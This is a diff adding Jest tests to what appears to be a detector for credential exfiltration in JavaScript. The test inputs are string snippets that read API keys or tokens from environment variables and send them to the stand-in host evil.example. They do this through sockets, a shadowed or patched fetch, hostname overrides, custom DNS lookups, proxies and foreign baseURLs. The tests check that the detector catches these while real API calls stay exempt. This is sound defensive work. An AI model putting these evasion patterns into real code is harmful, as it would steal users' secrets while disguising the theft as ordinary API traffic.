@@ -219,4 +219,48 @@ describe('credential sent to its own API', () => {
     expect(flows('const key = process.env.API_KEY;\nfetch("https://api.example.com/x", { headers: { Authorization: key } });')).toHaveLength(1);
     expect(flows('const e = process.env;\nfetch("https://api.openai.com/x", { headers: { "X-E": JSON.stringify(e) } });').length).toBeGreaterThan(0);
   });
+
+  it('dt20 g7-F2: exempts only real HTTP requests, not sockets or a local fetch', () => {
+    const key = 'const key = process.env.OPENAI_API_KEY;\n';
+    const hdr = '{ headers: { Authorization: key } }';
+    // Socket emit/send/write: the first argument is an event name or payload, not the destination
+    expect(flows(`const io = require("socket.io-client");\nconst s = io("https://evil.example");\ns.emit("https://api.openai.com/v1", { headers: { Authorization: process.env.OPENAI_API_KEY } });`)).toHaveLength(1);
+    expect(flows(`const WebSocket = require("ws");\nconst ws = new WebSocket("wss://evil.example");\n${key}ws.send("https://api.openai.com/v1", ${hdr});`)).toHaveLength(1);
+    expect(flows(`const net = require("net");\nconst c = net.connect(443, "evil.example");\nconst t = process.env.GITHUB_TOKEN;\nc.write("https://api.github.com/", { headers: { Authorization: t } });`)).toHaveLength(1);
+    // A locally defined fetch goes wherever it wants
+    const shadow = 'const https = require("https");\nfunction fetch(url, opts) {\n  const r = https.request({ hostname: "evil.example", method: "POST" });\n  r.end(JSON.stringify(opts));\n}\n';
+    expect(flows(`${shadow}${key}fetch("https://api.openai.com/v1/models", { headers: { Authorization: \`Bearer \${key}\` } });`).filter(f => f.sink === 'fetch')).toHaveLength(1);
+    // An object that merely has a post method is not an HTTP client
+    expect(flows(`const bus = makeBus();\n${key}bus.post("https://api.openai.com/v1", ${hdr});`)).toHaveLength(1);
+    // Real clients stay exempt: global fetch, globalThis.fetch, https.request, imported fetch
+    expect(flows(`${key}globalThis.fetch("https://api.openai.com/v1", ${hdr});`)).toEqual([]);
+    expect(flows(`const https = require("https");\n${key}https.request("https://api.openai.com/v1", ${hdr});`)).toEqual([]);
+    expect(flows(`import fetch from "node-fetch";\n${key}fetch("https://api.openai.com/v1", ${hdr});`)).toEqual([]);
+    expect(flows(`import got from "got";\n${key}got.post("https://api.openai.com/v1", ${hdr});`)).toEqual([]);
+  });
+
+  it('dt20 g7-N1: options that redirect the request or a patched global fetch void the exemption', () => {
+    const key = 'const key = process.env.OPENAI_API_KEY;\n';
+    const https = 'const https = require("https");\n';
+    const url = '"https://api.openai.com/v1/models"';
+    const auth = 'headers: { Authorization: `Bearer ${key}` }';
+    // h1/h6: options override the URL's host
+    expect(flows(`${https}${key}https.request(${url}, { hostname: "evil.example", ${auth} }).end();`)).toHaveLength(1);
+    expect(flows(`${https}${key}https.get(${url}, { host: "evil.example", port: 443, ${auth} });`)).toHaveLength(1);
+    // h2: custom DNS lookup / TLS verification off
+    expect(flows(`${https}${key}https.request(${url}, { ${auth}, lookup: (h, o, cb) => cb(null, "203.0.113.9", 4) }).end();`)).toHaveLength(1);
+    expect(flows(`${https}${key}https.request(${url}, { ${auth}, rejectUnauthorized: false }).end();`)).toHaveLength(1);
+    // h3: proxy
+    expect(flows(`const axios = require("axios");\n${key}axios.get(${url}, { ${auth}, proxy: { protocol: "http", host: "evil.example", port: 80 } });`)).toHaveLength(1);
+    // Options it cannot see (a spread) or a foreign baseURL are not trusted
+    expect(flows(`${https}${key}https.request(${url}, { ...extra, ${auth} });`)).toHaveLength(1);
+    expect(flows(`const axios = require("axios");\n${key}axios.get(${url}, { ${auth}, baseURL: "https://evil.example" });`)).toHaveLength(1);
+    // h4: global fetch replaced in the file
+    expect(flows(`globalThis.fetch = (u, o) => require("https").request({ hostname: "evil.example" }).end(JSON.stringify(o));\n${key}fetch(${url}, { ${auth} });`)).toHaveLength(1);
+    expect(flows(`window["fetch"] = myFetch;\n${key}window.fetch(${url}, { ${auth} });`)).toHaveLength(1);
+    // Plain options and an axios body variable keep the exemption
+    expect(flows(`${https}${key}https.request(${url}, { method: "GET", ${auth} }).end();`)).toEqual([]);
+    expect(flows(`const axios = require("axios");\n${key}axios.post(${url}, data, { ${auth} });`)).toEqual([]);
+    expect(flows(`${key}fetch(${url}, { method: "POST", ${auth}, redirect: "follow" });`)).toEqual([]);
+  });
 });
